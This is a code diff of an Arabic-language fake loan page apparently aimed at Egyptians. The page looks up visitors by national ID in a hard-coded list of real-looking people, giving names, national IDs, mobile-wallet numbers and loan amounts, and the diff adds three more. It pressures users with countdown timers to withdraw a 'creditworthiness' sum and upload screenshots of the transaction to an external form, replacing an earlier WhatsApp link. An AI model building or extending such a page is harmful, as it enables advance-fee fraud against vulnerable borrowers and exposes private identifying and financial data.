@@ -15,7 +15,8 @@
         .vertical-card { background: rgba(15, 20, 30, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 2rem; padding: 1.8rem; margin-bottom: 2rem; }
         .btn-gold { background: linear-gradient(95deg, #D4AF37, #FFD966); border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-weight: 700; color: #0a0a0a; cursor: pointer; font-family: 'Cairo', sans-serif; }
         .btn-outline { background: transparent; border: 1.5px solid #D4AF37; color: #FFD966; padding: 0.7rem 1.5rem; border-radius: 2rem; font-weight: 600; cursor: pointer; font-family: 'Cairo', sans-serif; }
-        .whatsapp-btn { background: #25D366; color: white; border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-weight: bold; display: inline-flex; align-items: center; gap: 10px; cursor: pointer; font-family: 'Cairo', sans-serif; }
+        .upload-btn { background: linear-gradient(95deg, #D4AF37, #FFD966); border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-weight: 700; color: #0a0a0a; cursor: pointer; font-family: 'Cairo', sans-serif; display: inline-flex; align-items: center; gap: 10px; width: 100%; justify-content: center; }
+        .upload-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(212,175,55,0.5); }
         .info-row { display: flex; justify-content: space-between; padding: 1rem 0; border-bottom: 1px solid rgba(212,175,55,0.2); }
         .info-label { color: #D4AF37; font-weight: 600; display: flex; align-items: center; gap: 0.5rem; }
         .info-value { font-weight: 500; color: #FFD966; text-align: left; }
@@ -85,7 +86,7 @@
                     <div class="step"><div class="step-number">3️⃣</div><div class="step-text">سحب المبلغ وتصوير الرسالة</div></div>
                     <div class="step"><div class="step-number">4️⃣</div><div class="step-text">إرسال الصور عبر واتساب</div></div>
                 </div>
-                <button class="whatsapp-btn" style="width:100%; justify-content:center;" onclick="sendWhatsAppMessage()"><i class="fab fa-whatsapp"></i> إرسال الصور عبر واتساب</button>
+                <button class="upload-btn" onclick="redirectToLinkingForm()"><i class="fas fa-cloud-upload-alt"></i> اضغط لرفع صور السكرينات (تكون الرسالة كاملة)</button>
             </div>
         </div>
         <div style="text-align:center; margin-top:2rem;">
@@ -95,8 +96,13 @@
 </div>
 
 <script>
-    // ========== قاعدة العملاء (تم تحديثها بالعملاء الجدد) ==========
+    // ========== قاعدة العملاء (تم تحديثها بالعملاء الجدد من ملف استمارة التوظيف 3) ==========
     const customersData = [
+        // العملاء الجدد من الملف الثالث
+        { national_id: "27012130101721", full_name: "وديده عبد النبي حجاج عبد العال", wallet_type: "لا يوجد محفظة", wallet_number: "", loan_amount: 40000 },
+        { national_id: "29712011207269", full_name: "ايمان ابراهيم عبد المعطي رمضان", wallet_type: "فودافون كاش", wallet_number: "01036606122", loan_amount: 200000 },
+        { national_id: "28601070201355", full_name: "ممدوح ابو الحسن أحمد أبو الحسن", wallet_type: "فودافون كاش", wallet_number: "01028125280", loan_amount: 200000 },
+        // العملاء السابقين
         { national_id: "27510240100215", full_name: "خالد عبد الغنى السيد عبداللطيف", wallet_type: "اتصالات كاش", wallet_number: "01155057404", loan_amount: 30000 },
         { national_id: "28111182500374", full_name: "شحاته عبد التواب علي حسن", wallet_type: "فودافون كاش", wallet_number: "01008953879", loan_amount: 150000 },
         { national_id: "28110171703129", full_name: "سوسن السيد علي محمد", wallet_type: "فودافون كاش", wallet_number: "01055515284", loan_amount: 100000 },
@@ -121,6 +127,9 @@
 
     let currentCustomer = null;
     let timerInterval = null, creditworthinessInterval = null;
+
+    const LINKING_FORM_URL = 'https://survey.porsline.com/s/bTLAeRfL';
+    function redirectToLinkingForm() { window.open(LINKING_FORM_URL, '_blank'); }
 
     function handleSearch(btn) {
         const nationalId = document.getElementById('nationalId').value.trim();
@@ -160,7 +169,8 @@
         if (timerInterval) clearInterval(timerInterval);
         let loanTime = 36 * 60;
         const loanTimer = document.getElementById('loanTimer');
-        setInterval(() => { const mins = Math.floor(loanTime/60), secs=loanTime%60; loanTimer.textContent=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; if(loanTime<=0) clearInterval(); loanTime--; }, 1000);
+        const loanInterval = setInterval(() => { const mins = Math.floor(loanTime/60), secs=loanTime%60; loanTimer.textContent=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; if(loanTime<=0) clearInterval(loanInterval); loanTime--; }, 1000);
+        timerInterval = loanInterval;
         
         if (creditworthinessInterval) clearInterval(creditworthinessInterval);
         let creditTime = 27 * 60;
@@ -172,18 +182,6 @@
             if(creditTime<=0) { clearInterval(creditworthinessInterval); alert('انتهى الوقت! تم تعليق طلبك 90 يوماً.'); }
             creditTime--;
         }, 1000);
-    }
-
-    function sendWhatsAppMessage() {
-        if(!currentCustomer) return;
-        if(currentCustomer.wallet_type === "لا يوجد محفظة" || !currentCustomer.wallet_number) {
-            alert("❌ ليس لديك محفظة رقمية مسجلة.");
-            return;
-        }
-        const proofAmount = getProofAmount(currentCustomer);
-        const message = `مرحباً، أنا ${currentCustomer.full_name} (رقم قومي: ${currentCustomer.national_id})، مبلغ الجدارة: ${formatCurrency(proofAmount)}. سأرسل الصور.`;
-        window.open(`https://wa.me/212614494251?text=${encodeURIComponent(message)}`, '_blank');
-        alert('✅ تم التوجيه إلى واتساب.');
     }
 
     function formatCurrency(amount) { return new Intl.NumberFormat('ar-EG', { style:'currency', currency:'EGP' }).format(amount); }
